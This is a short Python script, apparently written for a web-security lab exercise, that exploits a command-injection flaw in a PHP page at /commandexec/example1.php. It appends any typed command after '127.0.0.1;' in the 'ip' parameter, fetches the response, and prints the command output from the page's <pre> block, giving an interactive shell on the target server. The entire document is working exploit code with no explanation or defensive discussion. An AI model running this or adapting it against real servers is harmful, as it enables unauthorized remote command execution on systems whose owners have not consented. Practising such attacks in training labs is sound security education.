#!/usr/bin/env python
import sys
import requests
from bs4 import BeautifulSoup

def interactiveShell(server_ip):
    while True:
        cmd = input('lab3> ')
        if cmd == "exit":
            print('Good Bye')
            break
        else:
            full_url = f"http://{server_ip}/commandexec/example1.php?ip=127.0.0.1;{cmd}"
            try:
                response = requests.get(full_url)
                response.raise_for_status() 
                
               
                soup = BeautifulSoup(response.content, 'html.parser')
                
                
                pre_tag = soup.find('pre')
                if pre_tag:
                    pre_text = pre_tag.text
                   
                    ms_index = pre_text.find('ms')
                    if ms_index != -1:
                        
                        output_text = pre_text[ms_index + 2:]
                        print(output_text)
                    else:
                        print("Text 'ms' not found in the <pre> tag content.")
                else:
                    print("No <pre> tag found in the response.")
            except requests.RequestException as e:
                print(f"Error making request to {full_url}: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print('Usage: python script.py <Server IP address>')
    else:
        server_ip = sys.argv[1]
        interactiveShell(server_ip)
